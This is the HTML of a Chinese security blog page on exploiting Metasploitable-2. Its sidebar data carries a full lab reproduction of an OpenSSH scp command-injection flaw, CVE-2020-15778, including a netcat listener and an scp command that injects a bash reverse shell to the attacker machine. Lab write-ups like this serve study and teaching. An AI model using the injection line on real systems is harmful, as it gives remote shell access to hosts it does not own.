<!DOCTYPE html><html lang="zh-CN" class="vertical-scrollbar" data-astro-transition-scope="astro-smooz4hq-1"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><meta name="generator" content="Astro v5.16.6"><title>Metasploitable-2 | Reproduction | 应神上の博客</title><!-- Preconnect to third-party origins for faster resource loading --><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="preconnect" href="https://chinese-font.netlify.app" crossorigin><link rel="dns-prefetch" href="https://chinese-font.netlify.app"><!-- Async load Chinese fonts to avoid render-blocking --><link rel="stylesheet" href="/fonts/ChillRoundFRegular/result.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/fonts/ChillRoundFBold/result.css" media="print" onload="this.media='all'"><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.QW52Ox2j.js"></script><style>.astro-loading-indicator {
  pointer-events: none;
  background-color: #e9536a;
  position: fixed;
  z-index: 1031;
  top: 0;
  left: 0;
  width: 100%;
  height: 2px;
  transition: transform 300ms ease-out, opacity 150ms 150ms ease-in;
	transform: translate3d(0, 0, 0) scaleX(var(--progress, 0));
  transform-origin: 0;
}

[dir="rtl"] .astro-loading-indicator {
  transform-origin: 100% 0;
}
</style><script>(function(){const className = "astro-loading-indicator";
const animationDuration = 300;
const threshold = 200;

(() => {
  let progress = 0.25
  let opacity = 0
  /** @type {number | undefined} */
  let trickleInterval = undefined
  /** @type {number | undefined} */
  let thresholdTimeout = undefined;

  const element = document.createElement("div")
  element.classList.add(className)
  element.ariaHidden = "true"

  /** @param {typeof progress} _progress */
  const setProgress = (_progress) => {
    progress = _progress
    element.style.setProperty('--progress', String(progress))
  }

  /** @param {typeof opacity} _opacity */
  const setOpacity = (_opacity) => {
    opacity = _opacity
    element.style.setProperty('opacity', String(opacity))
  }

  setOpacity(opacity)

  document.addEventListener("DOMContentLoaded", () => {
    document.body.prepend(element)
  })

  document.addEventListener("astro:before-preparation", () => {
    thresholdTimeout = setTimeout(() => {
      setOpacity(1)
      trickleInterval = window.setInterval(() => {
        setProgress(progress + Math.random() * 0.03)
      }, animationDuration)
    }, threshold)
  })

  document.addEventListener("astro:before-swap", (ev) => {
    if (!thresholdTimeout) {
      return
    }
    window.clearTimeout(thresholdTimeout)

    ev.newDocument.body.prepend(element)
    window.clearInterval(trickleInterval)
    trickleInterval = undefined

    setProgress(1)
    window.setTimeout(() => {
      setOpacity(0)
    }, animationDuration / 2)

    window.setTimeout(() => {
      setProgress(0.25)
    }, animationDuration * 2)
  })
})()
})();</script><script type="module" src="/_astro/Tooltips.astro_astro_type_script_index_0_lang.Bx2cGmPu.js"></script><!-- metadata --><meta name="description" content="Information Gathering The scanning result is as enclosure. Mehod1:CVE-2007-2447 Same as metasploitable-1,method1 Method2:CVE-2011-2523 it's &#34;root&#34;..."><meta name="author" content="Kaguya"><meta property="og:type" content="website"><meta property="og:site_name" content="Kaguya"><meta property="og:url" content="https://kaguyahi.github.io/blog/post/11/"><meta property="og:title" content="Metasploitable-2 | Reproduction | 应神上の博客"><meta property="og:description" content="Information Gathering The scanning result is as enclosure. Mehod1:CVE-2007-2447 Same as metasploitable-1,method1 Method2:CVE-2011-2523 it's &#34;root&#34;..."><!-- <meta property="og:image" content="/opengraph.png?v=1" /> TODO: og image--><meta name="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://kaguyahi.github.io/blog/post/11/"><meta name="twitter:title" content="Metasploitable-2 | Reproduction | 应神上の博客"><meta name="twitter:description" content="Information Gathering The scanning result is as enclosure. Mehod1:CVE-2007-2447 Same as metasploitable-1,method1 Method2:CVE-2011-2523 it's &#34;root&#34;..."><script>
      // 立即执行主题检查 否则会闪烁
      if (
        localStorage.theme === 'dark' ||
        (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)
      ) {
        document.documentElement.classList.add('dark');
        document.documentElement.classList.remove('light');
        document.documentElement.dataset.theme = 'dark';
      } else {
        document.documentElement.classList.remove('dark');
        document.documentElement.classList.add('light');
        document.documentElement.dataset.theme = 'light';
      }
    </script><script>
      // iOS Safari pinch-zoom guard (viewport meta alone is not always respected)
      (() => {
        const blockGesture = (event) => event.preventDefault();
        document.addEventListener('gesturestart', blockGesture, { passive: false });
        document.addEventListener('gesturechange', blockGesture, { passive: false });
        document.addEventListener('gestureend', blockGesture, { passive: false });
      })();
    </script><!--主题检查切换对应值--><script type="module" src="/_astro/Layout.astro_astro_type_script_index_0_lang.D2B82Q8W.js"></script><!--FIXED:  SPA主题切换不渲染, tab栏切换变浅色问题。--><script type="module">function e(){localStorage.theme==="dark"||!("theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?(document.documentElement.classList.add("dark"),document.documentElement.classList.remove("light"),document.documentElement.dataset.theme="dark"):(document.documentElement.classList.remove("dark"),document.documentElement.classList.add("light"),document.documentElement.dataset.theme="light")}document.addEventListener("astro:page-load",e);</script><link rel="stylesheet" href="/_astro/about.CGdkTp_6.css">
<link rel="stylesheet" href="/_astro/_slug_.D059aVq8.css">
<link rel="stylesheet" href="/_astro/about.BZJMtSnI.css">
<link rel="stylesheet" href="/_astro/index.Lf6pSiPd.css"><script type="module" src="/_astro/page.BKvqMfX1.js"></script><style>[data-astro-transition-scope="astro-smooz4hq-1"] { view-transition-name: root; }@layer astro { ::view-transition-old(root) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }::view-transition-new(root) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(root) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(root) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-smooz4hq-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-smooz4hq-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-smooz4hq-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-smooz4hq-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }</style></head> <body> <div class="flex min-h-screen flex-col text-black dark:text-white"> <style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(()=>{var a=(s,i,o)=>{let r=async()=>{await(await s())()},t=typeof i.value=="object"?i.value:void 0,c={rootMargin:t==null?void 0:t.rootMargin},n=new IntersectionObserver(e=>{for(let l of e)if(l.isIntersecting){n.disconnect(),r();break}},c);for(let e of o.children)n.observe(e)};(self.Astro||(self.Astro={})).visible=a;window.dispatchEvent(new Event("astro:visible"));})();</script><script>(()=>{var A=Object.defineProperty;var g=(i,o,a)=>o in i?A(i,o,{enumerable:!0,configurable:!0,writable:!0,value:a}):i[o]=a;var d=(i,o,a)=>g(i,typeof o!="symbol"?o+"":o,a);{let i={0:t=>m(t),1:t=>a(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(a(t)),5:t=>new Set(a(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t),11:t=>1/0*t},o=t=>{let[l,e]=t;return l in i?i[l](e):void 0},a=t=>t.map(o),m=t=>typeof t!="object"||t===null?t:Object.fromEntries(Object.entries(t).map(([l,e])=>[l,o(e)]));class y extends HTMLElement{constructor(){super(...arguments);d(this,"Component");d(this,"hydrator");d(this,"hydrate",async()=>{var b;if(!this.hydrator||!this.isConnected)return;let e=(b=this.parentElement)==null?void 0:b.closest("astro-island[ssr]");if(e){e.addEventListener("astro:hydrate",this.hydrate,{once:!0});return}let c=this.querySelectorAll("astro-slot"),n={},h=this.querySelectorAll("template[data-astro-template]");for(let r of h){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("data-astro-template")||"default"]=r.innerHTML,r.remove())}for(let r of c){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("name")||"default"]=r.innerHTML)}let p;try{p=this.hasAttribute("props")?m(JSON.parse(this.getAttribute("props"))):{}}catch(r){let s=this.getAttribute("component-url")||"<unknown>",v=this.getAttribute("component-export");throw v&&(s+=` (export ${v})`),console.error(`[hydrate] Error parsing props for component ${s}`,this.getAttribute("props"),r),r}let u;await this.hydrator(this)(this.Component,p,n,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))});d(this,"unmount",()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))})}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(!this.hasAttribute("await-children")||document.readyState==="interactive"||document.readyState==="complete")this.childrenConnectedCallback();else{let e=()=>{document.removeEventListener("DOMContentLoaded",e),c.disconnect(),this.childrenConnectedCallback()},c=new MutationObserver(()=>{var n;((n=this.lastChild)==null?void 0:n.nodeType)===Node.COMMENT_NODE&&this.lastChild.nodeValue==="astro:end"&&(this.lastChild.remove(),e())});c.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",e)}}async childrenConnectedCallback(){let e=this.getAttribute("before-hydration-url");e&&await import(e),this.start()}async start(){let e=JSON.parse(this.getAttribute("opts")),c=this.getAttribute("client");if(Astro[c]===void 0){window.addEventListener(`astro:${c}`,()=>this.start(),{once:!0});return}try{await Astro[c](async()=>{let n=this.getAttribute("renderer-url"),[h,{default:p}]=await Promise.all([import(this.getAttribute("component-url")),n?import(n):()=>()=>{}]),u=this.getAttribute("component-export")||"default";if(!u.includes("."))this.Component=h[u];else{this.Component=h;for(let f of u.split("."))this.Component=this.Component[f]}return this.hydrator=p,this.hydrate},e,this)}catch(n){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,n)}}attributeChangedCallback(){this.hydrate()}}d(y,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",y)}})();</script><astro-island uid="pXtAg" prefix="r11" component-url="/_astro/Header.tY410c8a.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;isPostPage&quot;:[0,true],&quot;tocNumbering&quot;:[0,true],&quot;tocHeadings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;mehod1cve-2007-2447&quot;],&quot;text&quot;:[0,&quot;Mehod1:CVE-2007-2447&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method2cve-2011-2523&quot;],&quot;text&quot;:[0,&quot;Method2:CVE-2011-2523&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method3cve-2004-2687&quot;],&quot;text&quot;:[0,&quot;Method3:CVE-2004-2687&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method4cve-2012-1823&quot;],&quot;text&quot;:[0,&quot;Method4:CVE-2012-1823&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclosure&quot;],&quot;text&quot;:[0,&quot;Enclosure&quot;]}]]]}" ssr client="visible" opts="{&quot;name&quot;:&quot;Header&quot;,&quot;value&quot;:true}" await-children><link rel="preload" as="image" href="/_astro/logo.Gai7gqE6.webp"/><div id="site-header" class="shadow-text fixed inset-x-0 top-0 z-10 gap-4 py-2.5 text-white select-none tablet:backdrop-blur tablet:py-2 tablet:pl-3 tablet:pr-3" style="view-transition-name:site-header"><div class="site-header-bg pointer-events-none absolute inset-0"></div><div class="relative z-10 mx-auto flex items-center justify-between px-6 tablet:w-full tablet:px-0 max-w-7xl"><a class="tablet:hidden -my-4 mr-4 flex cursor-pointer items-center justify-center gap-1 whitespace-nowrap" href="/" target="_self" title="Kaguya" aria-label="Kaguya" data-astro-transition-persist="page-header-avatar" style="view-transition-name:page-header-avatar"><img src="/_astro/logo.Gai7gqE6.webp" alt="Kaguya" class="mt-2 mb-2 h-16"/></a><div class="tablet:flex w-full h-full tablet:grow hidden items-center justify-center"><a href="/blog" class="flex items-center gap-1"><img src="/_astro/logo.Gai7gqE6.webp" alt="Kaguya" class="h-8" height="32"/></a></div><div class="tablet:grow-0 flex grow items-center" style="view-transition-name:page-header"><div class="tablet:hidden flex grow items-center gap-4"><a href="/blog" aria-label="文章" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-solid fa-pen-nib" aria-hidden="true"></i>文章</a><a href="/blog/categories" aria-label="分类" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-solid fa-layer-group" aria-hidden="true"></i>分类</a><a href="/blog/tags" aria-label="标签" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-solid fa-tags" aria-hidden="true"></i>标签</a><a href="/blog/archives" aria-label="归档" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-solid fa-solid fa-flag" aria-hidden="true"></i>归档</a><a href="/blog/friends" aria-label="友链" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-solid fa-link" aria-hidden="true"></i>友链</a><a href="/blog/about" aria-label="关于" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-solid fa-user" aria-hidden="true"></i>关于</a></div><div class="ml-auto flex items-center gap-2"><button id="search-trigger" class="group cursor-pointer transition duration-300 hover:scale-125" aria-label="搜索" title="搜索 (⌘K)"><i class="fa-solid fa-magnifying-glass text-2xl" aria-hidden="true"></i></button><div id="search-component-portal" style="display:none;position:absolute;pointer-events:none;visibility:hidden"><div id="search-for-dialog" class="pagefind-ui" data-pagefind-ui="true"></div></div><style>
        .scroll-feather-mask {
          container-type: scroll-state;
        }
        @container scroll-state(scrollable: bottom) {
          .scroll-feather-mask::before {
            content: '';
            background: linear-gradient(
              to bottom,
              transparent 0%,
              var(--gradient-bg-start) var(--scroll-mask-middle, 70%),
              var(--gradient-bg-start) var(--scroll-mask-end, 100%)
            );
            position: absolute;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 10;
            display: block;
            height: var(--scroll-mask-height, 5rem);
          }
        }
      </style><button class="theme-toggle text-2xl cursor-pointer bg-transparent border-0 p-0 transition-transform duration-300 hover:scale-110" id="theme-toggle-btn" type="button" aria-label="toggle theme" aria-pressed="false"><i class="fa-solid fa-sun text-2xl light-icon transition-all duration-300" style="opacity:1;transform:rotate(0deg) scale(1)"></i><i class="fa-solid fa-moon text-2xl dark-icon transition-all duration-300" style="opacity:0;transform:rotate(-180deg) scale(0)"></i></button><style>
        .theme-toggle {
          position: relative;
          z-index: 10;
          width: 36px;
          height: 36px;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .theme-toggle i {
          position: absolute;
          text-shadow: none;
          filter: none;
        }
      </style></div></div></div></div><!--astro:end--></astro-island> <main class="relative flex grow flex-col gap-4">   <div class="flex flex-col"> <div class="relative flex h-[60dvh] max-h-200 overflow-hidden"> <div class="absolute inset-0 h-full bg-black/40"></div> <div class="absolute inset-0 bottom-[8dvh] flex flex-col items-center justify-center px-5 text-white">  <h1 class="shadow-text word-break text-4.5xl text-center font-bold md:text-2xl max-w-7xl flex flex-wrap items-center justify-center gap-3"> Metasploitable-2  </h1> <p class="mt-3 flex items-center justify-center gap-4 md:text-xs"> <span class="flex items-center gap-1"> <i class="fa-regular fa-calendar-days" aria-hidden="true"></i>
发表于 2023-03-20 </span> <span class="flex items-center gap-1"> <i class="fa-solid fa-pen-nib" aria-hidden="true"></i> 1445 字
</span> <span class="flex items-center gap-1"> <i class="fa-regular fa-clock" aria-hidden="true"></i> 8 min read </span> </p> </div> <div class="relative -z-10 h-full min-h-60 w-full" data-astro-transition-persist="page-cover-banner" id="banner-box" style="background-image:linear-gradient(135deg, #c59d88 0%, #a98273 50%, #8c6761 100%)"> <img src="/img/backgrounds/imgi_9_uICr5VITOqgWqVu0.webp" alt="cover" class="h-full w-full object-cover" sizes="50vw"> </div> <div class="wave-wrap"><svg class="wave" xmlns="http://www.w3.org/2000/svg" viewBox="0 24 150 28" preserveAspectRatio="none"><defs><path id="gentle-wave" d="m -160,44.4 c 30,0 58,-18 87.7,-18 30.3,0 58.3,18 87.3,18 30,0 58,-18 88,-18 30,0 58,18 88,18 l 0,34.5 -351,0 z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="50" y="0" fill="rgba(255, 255, 255, 0.48)"></use><use xlink:href="#gentle-wave" x="50" y="3" fill="rgba(255, 255, 255, 0.78)"></use><use xlink:href="#gentle-wave" x="50" y="6" fill="rgba(255, 255, 255, 0.8)"></use></g></svg></div> </div> <div class="mx-auto md:mx-0 flex w-full items-start justify-center md:w-full max-w-7xl"> <div class="page-home-sider shadow-home-sider sticky top-0 self-start flex min-w-64 max-w-64 flex-col tablet:hidden overflow-hidden h-screen min-h-0 items-center px-2" transition:name="page-home-sider"> <script>(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).load=e;window.dispatchEvent(new Event("astro:load"));})();</script><astro-island uid="Xk2oW" prefix="r10" component-url="/_astro/HomeSiderPanel.CZL0IHOQ.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;type&quot;:[0,&quot;post&quot;],&quot;defaultSegmentType&quot;:[0,&quot;directory&quot;],&quot;homeInfo&quot;:[0,{&quot;avatar&quot;:[0,&quot;/img/avatar.webp&quot;],&quot;name&quot;:[0,&quot;Kaguya&quot;],&quot;description&quot;:[0,&quot;ACG / 养猫人 / 菜逼 / 黑客 / 臭美&quot;],&quot;postCount&quot;:[0,20],&quot;categoryCount&quot;:[0,5],&quot;tagCount&quot;:[0,20],&quot;routes&quot;:[1,[[0,{&quot;name&quot;:[0,&quot;文章&quot;],&quot;path&quot;:[0,&quot;/blog&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-pen-nib&quot;]}],[0,{&quot;name&quot;:[0,&quot;分类&quot;],&quot;path&quot;:[0,&quot;/blog/categories&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-layer-group&quot;]}],[0,{&quot;name&quot;:[0,&quot;标签&quot;],&quot;path&quot;:[0,&quot;/blog/tags&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-tags&quot;]}],[0,{&quot;name&quot;:[0,&quot;归档&quot;],&quot;path&quot;:[0,&quot;/blog/archives&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-solid fa-flag&quot;]}],[0,{&quot;name&quot;:[0,&quot;友链&quot;],&quot;path&quot;:[0,&quot;/blog/friends&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-link&quot;]}],[0,{&quot;name&quot;:[0,&quot;关于&quot;],&quot;path&quot;:[0,&quot;/blog/about&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-user&quot;]}]]],&quot;currentPath&quot;:[0,&quot;/blog/post/11/&quot;]}],&quot;tocHeadings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;mehod1cve-2007-2447&quot;],&quot;text&quot;:[0,&quot;Mehod1:CVE-2007-2447&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method2cve-2011-2523&quot;],&quot;text&quot;:[0,&quot;Method2:CVE-2011-2523&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method3cve-2004-2687&quot;],&quot;text&quot;:[0,&quot;Method3:CVE-2004-2687&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method4cve-2012-1823&quot;],&quot;text&quot;:[0,&quot;Method4:CVE-2012-1823&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclosure&quot;],&quot;text&quot;:[0,&quot;Enclosure&quot;]}]]],&quot;tocNumbering&quot;:[0,true],&quot;seriesPostItems&quot;:[1,[[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/cve-2020-15778-openssh命令注入漏洞复现&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;CVE-2020-15778-OpenSSH命令注入漏洞复现&quot;],&quot;date&quot;:[3,&quot;2026-01-19T01:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;CVE-2020-15778&quot;],[0,&quot;SSH&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;# 漏洞描述\n    OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发， 并以BSD样式的许可证提供，且已被集成到许多商业产品中。\n2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。\n# 适用场景\n\n对于用户来说，ssh被阻止，但在authorized_keys文件中的命令选项允许使用scp的情况下，可以绕过此限制并在远程服务器上执行命令。也就是说，实际中通过各种手段获取到ssh的用户密码，但是不允许ssh连接，或者IP连接受限等情况下，可以尝试此漏洞进行利用。\n# 漏洞等级\n高危\n# 漏洞影响版本\nOpenSSH &lt;=8.3p1\n# 漏洞复现\nscp 是 secure copy 的缩写。在linux系统中，scp用于linux之间复制文件和目录，基于 ssh 登陆进行安全的远程文件拷贝命令。该命令由openssh的scp.c及其他相关代码实现。\n攻击机：192.168.100.238\n\n靶机：192.168.100.28\n\n先在本地建好文件，上传\n```\ntouch 1.txt\n开启本地监听\nnc -lvvp 4444\n使用scp命令注入反弹shell\nscp 1.txt i@192.168.100.28:&#39;`bash -i &gt;&amp; /dev/tcp/192.168.100.238/4444 0&gt;&amp;1`/tmp/test.txt&#39;\n```\n![](img/p1.png)\n![](img/p2.png)&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/CVE-2020-15778-OpenSSH命令注入漏洞复现.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/p1.png&quot;],[0,&quot;img/p2.png&quot;]]],&quot;digest&quot;:[0,&quot;cd1338296e7fd284&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;漏洞描述\&quot;&gt;漏洞描述&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#漏洞描述\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发， 并以BSD样式的许可证提供，且已被集成到许多商业产品中。&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。&lt;/p&gt;\n&lt;h1 id=\&quot;适用场景\&quot;&gt;适用场景&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#适用场景\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;对于用户来说，ssh被阻止，但在authorized_keys文件中的命令选项允许使用scp的情况下，可以绕过此限制并在远程服务器上执行命令。也就是说，实际中通过各种手段获取到ssh的用户密码，但是不允许ssh连接，或者IP连接受限等情况下，可以尝试此漏洞进行利用。&lt;/p&gt;\n&lt;h1 id=\&quot;漏洞等级\&quot;&gt;漏洞等级&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#漏洞等级\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;高危&lt;/p&gt;\n&lt;h1 id=\&quot;漏洞影响版本\&quot;&gt;漏洞影响版本&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#漏洞影响版本\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;OpenSSH &amp;#x3C;=8.3p1&lt;/p&gt;\n&lt;h1 id=\&quot;漏洞复现\&quot;&gt;漏洞复现&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#漏洞复现\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;scp 是 secure copy 的缩写。在linux系统中，scp用于linux之间复制文件和目录，基于 ssh 登陆进行安全的远程文件拷贝命令。该命令由openssh的scp.c及其他相关代码实现。\n攻击机：192.168.100.238&lt;/p&gt;\n&lt;p&gt;靶机：192.168.100.28&lt;/p&gt;\n&lt;p&gt;先在本地建好文件，上传&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;touch 1.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;开启本地监听&lt;/span&gt;&lt;/span&gt;\n&lt;span 